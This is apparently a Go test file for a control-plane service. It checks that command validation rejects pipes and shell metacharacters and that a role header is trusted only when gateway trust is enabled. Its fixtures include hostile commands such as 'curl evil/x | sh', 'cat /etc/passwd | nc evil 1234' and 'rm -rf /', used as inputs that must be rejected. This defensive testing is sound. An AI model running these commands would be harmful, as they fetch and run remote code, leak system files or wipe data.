// command_validation_test.go — 安全加固测试：
//   - validateCommand 拦截管道符 |（防 `curl evil/x | sh` 管道注入）
//   - requireProd X-User-Roles 信任模型（仅当 cfg.TrustGatewayHeaders=true 时才信任）
package controlplane

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"opsmesh/internal/config"
	"opsmesh/internal/store"
)

// =============================================================================
// validateCommand 拦截管道符 |
// =============================================================================

// TestValidateCommand_RejectsPipe 验证 validateCommand 拦截管道符 |。
// 原实现注释明写"管道符 | 暂不拦截"，导致 `curl evil/x | sh` 等管道注入载荷可过校验。
func TestValidateCommand_RejectsPipe(t *testing.T) {
	cases := []struct {
		name, command string
	}{
		{"pipe_injection", "curl evil/x | sh"},
		{"pipe_cat_passwd", "cat /etc/passwd | nc evil 1234"},
		{"pipe_grep", "systemctl status nginx | grep Active"},
		{"pipe_double", "a | b | c"},
		{"pipe_leading", "| cat"},
		{"pipe_trailing", "cat |"},
	}
	for _, c := range cases {
		err := validateCommand(c.command)
		if err == nil {
			t.Errorf("命令 %q（场景 %s）含管道符应被拒绝，但通过了", c.command, c.name)
		}
	}
}

// TestValidateCommand_AllowsAmpAmp 验证 && 仍被允许（合法命令链接符，已在 validateCommand 中特殊处理）。
func TestValidateCommand_AllowsAmpAmp(t *testing.T) {
	cases := []string{
		"true && echo ok",
		"systemctl status nginx && echo running",
	}
	for _, c := range cases {
		if err := validateCommand(c); err != nil {
			t.Errorf("合法命令 %q 不应被拒绝: %v", c, err)
		}
	}
}

// TestValidateCommand_AllowsSafe 验证合法单命令仍放行（确保管道符拦截未误伤）。
func TestValidateCommand_AllowsSafe(t *testing.T) {
	cases := []string{
		"echo hello",
		"ls -la /tmp",
		"systemctl status nginx",
		"cat /etc/hostname",
	}
	for _, c := range cases {
		if err := validateCommand(c); err != nil {
			t.Errorf("合法命令 %q 不应被拒绝: %v", c, err)
		}
	}
}

// TestValidateCommand_RejectsOtherMetachars 回归验证其他元字符仍被拦截（确保管道符拦截未破坏既有逻辑）。
func TestValidateCommand_RejectsOtherMetachars(t *testing.T) {
	cases := []struct {
		name, command, substr string
	}{
		{"newline", "ls\nrm -rf /", "newline"},
		{"semicolon", "ls;rm -rf /", "separator"},
		{"backtick", "a`whoami`b", "backtick"},
		{"cmd_subst", "a$(id)b", "substitution"},
		{"single_amp", "ls & echo bg", "background"},
	}
	for _, c := range cases {
		err := validateCommand(c.command)
		if err == nil {
			t.Errorf("命令 %q（场景 %s）应被拒绝，但通过了", c.command, c.name)
			continue
		}
	}
}

// =============================================================================
// requireProd X-User-Roles 信任模型
// =============================================================================

// newP02TestServer 构造非 demo 模式的测试 Server（用于 requireProd X-User-Roles 信任模型测试）。
// demo=false：避免 demo 模式放行掩盖信任模型行为。
func newP02TestServer(trustGateway bool) *Server {
	st := store.NewMemoryStore()
	ss := store.NewInProcessSessionStore()
	return &Server{
		store:        st,
		cfg:          &config.Config{Demo: false, TrustGatewayHeaders: trustGateway},
		sessionStore: ss,
		jwtSecret:    []byte("test-jwt-secret-for-p02-trust-gateway-32b!"),
		loginGuard:   newLoginGuard(ss),
	}
}

// TestRequireProd_GatewayRolesIgnoredByDefault 验证：
// 默认 TrustGatewayHeaders=false 时，X-User-Roles 头被忽略，非 demo 模式 → 401。
// 原实现直接信任 X-User-Roles 头，客户端自称 admin 即得 admin 权限。
func TestRequireProd_GatewayRolesIgnoredByDefault(t *testing.T) {
	s := newP02TestServer(false) // TrustGatewayHeaders=false（默认）
	req := httptest.NewRequest(http.MethodGet, "/api/v1/devices", nil)
	req.Header.Set("X-User-Roles", "admin") // 客户端自称 admin
	rec := httptest.NewRecorder()
	if _, ok := s.requireProd(rec, req, "device:read"); ok {
		t.Fatal("默认 TrustGatewayHeaders=false 时 X-User-Roles 头应被忽略，requireProd 不应放行")
	}
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("默认应返回 401（无可用身份），得到 %d；body=%s", rec.Code, rec.Body.String())
	}
}

// TestRequireProd_GatewayRolesTrustedWhenEnabled 验证 TrustGatewayHeaders=true 时
// X-User-Roles 头被信任，走 authorizeByRoles 路径，admin 角色放行。
func TestRequireProd_GatewayRolesTrustedWhenEnabled(t *testing.T) {
	s := newP02TestServer(true) // TrustGatewayHeaders=true
	req := httptest.NewRequest(http.MethodGet, "/api/v1/devices", nil)
	req.Header.Set("X-User-Roles", "admin") // admin 角色有 device:read 权限
	rec := httptest.NewRecorder()
	if _, ok := s.requireProd(rec, req, "device:read"); !ok {
		t.Fatalf("TrustGatewayHeaders=true 时 admin 角色应放行 device:read，得到 %d；body=%s", rec.Code, rec.Body.String())
	}
}

// TestRequireProd_GatewayRolesTrustedButDenied 验证 TrustGatewayHeaders=true 时
// X-User-Roles 头被信任，但 viewer 角色无 device:delete 权限 → 403。
func TestRequireProd_GatewayRolesTrustedButDenied(t *testing.T) {
	s := newP02TestServer(true) // TrustGatewayHeaders=true
	req := httptest.NewRequest(http.MethodDelete, "/api/v1/devices/x", nil)
	req.Header.Set("X-User-Roles", "viewer") // viewer 无 device:delete 权限
	rec := httptest.NewRecorder()
	if _, ok := s.requireProd(rec, req, "device:delete"); ok {
		t.Fatal("viewer 角色无 device:delete 权限，应被拒绝")
	}
	if rec.Code != http.StatusForbidden {
		t.Fatalf("viewer 应返回 403（权限不足），得到 %d；body=%s", rec.Code, rec.Body.String())
	}
}

// TestRequireProd_GatewayRolesIgnoredFallsBackToDemo 验证 TrustGatewayHeaders=false 时
// X-User-Roles 头被忽略，但 demo 模式放行（确保忽略后继续走 demo 路径而非直接拒绝）。
func TestRequireProd_GatewayRolesIgnoredFallsBackToDemo(t *testing.T) {
	st := store.NewMemoryStore()
	ss := store.NewInProcessSessionStore()
	s := &Server{
		store:        st,
		cfg:          &config.Config{Demo: true, TrustGatewayHeaders: false}, // demo=true 但不信任网关头
		sessionStore: ss,
		jwtSecret:    []byte("test-jwt-secret-for-p02-demo-fallback-32b!"),
		loginGuard:   newLoginGuard(ss),
	}
	req := httptest.NewRequest(http.MethodGet, "/api/v1/devices", nil)
	req.Header.Set("X-User-Roles", "admin") // 头存在但应被忽略
	rec := httptest.NewRecorder()
	if _, ok := s.requireProd(rec, req, "device:read"); !ok {
		t.Fatalf("demo 模式应放行（忽略 X-User-Roles 后走 demo 路径），得到 %d；body=%s", rec.Code, rec.Body.String())
	}
}

// TestRequireProd_BearerTokenStillWorks 验证 TrustGatewayHeaders=false 不影响 Bearer token 路径。
// Bearer token 是密码学验证的身份来源，应始终被信任（与网关头信任模型独立）。
func TestRequireProd_BearerTokenStillWorks(t *testing.T) {
	s := newP02TestServer(false) // TrustGatewayHeaders=false
	// 构造 admin JWT token
	u := s.store.GetUserByUsername("admin")
	if u == nil {
		t.Fatal("预置 admin 用户不存在")
	}
	u.RoleIDs = []string{"role-admin"}
	s.store.UpdateUser(u)
	s.store.ChangePassword(u.ID, u.PasswordHash) // 清除改密标记
	token, err := s.issueUserToken(u)
	if err != nil {
		t.Fatalf("issueUserToken: %v", err)
	}
	req := httptest.NewRequest(http.MethodGet, "/api/v1/devices", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	if _, ok := s.requireProd(rec, req, "device:read"); !ok {
		t.Fatalf("Bearer token 路径应放行（与网关头信任模型独立），得到 %d；body=%s", rec.Code, rec.Body.String())
	}
}
